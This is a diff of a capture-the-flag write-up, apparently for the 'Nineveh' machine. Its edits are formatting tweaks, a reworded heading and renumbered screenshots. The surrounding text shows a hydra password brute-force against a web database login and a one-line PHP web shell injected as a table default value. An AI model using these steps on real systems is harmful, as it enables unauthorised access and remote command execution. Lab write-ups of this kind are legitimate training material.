@@ -330,9 +330,7 @@ To perform the attack, we use `hydra` with the following options:
 
 - `https-post-form`: Specifies the HTTPS POST form module.
 
-- `/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.`
-
-This format defines the login path, the form field to fuzz, and the failure message. `^PASS^` is replaced by each password from the list, and `"Incorrect password"` is used to detect login failures.
+- `/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.`: This format defines the login path, the form field to fuzz, and the failure message. `^PASS^` is replaced by each password from the list, and `"Incorrect password"` is used to detect login failures.
 
 Now, we can run it:
 
@@ -381,11 +379,12 @@ In this case, we'll create a database named `exploit.php`:
 <br />
 
 ![9](../../../assets/images/Nineveh/9.png)
+
 ![10](../../../assets/images/Nineveh/10.png)
 
 <br />
 
-### 2.- Create a new table in our database with our malicious php code:.
+### 2.- Create a table in our new database:.
 
 <br />
 
@@ -393,7 +392,7 @@ The table only needs one field:
 
 <br />
 
-![10](../../../assets/images/Nineveh/10.png)
+![11](../../../assets/images/Nineveh/11.png)
 
 <br />
 
@@ -404,7 +403,7 @@ Set the field `"Type"` to `TEXT`, and enter the following php code into the `"De
 ```php
 <?php system($_GET["cmd"]); ?>
 ```
-![11](../../../assets/images/Nineveh/11.png)
+![12](../../../assets/images/Nineveh/12.png)
 
 <br />
 
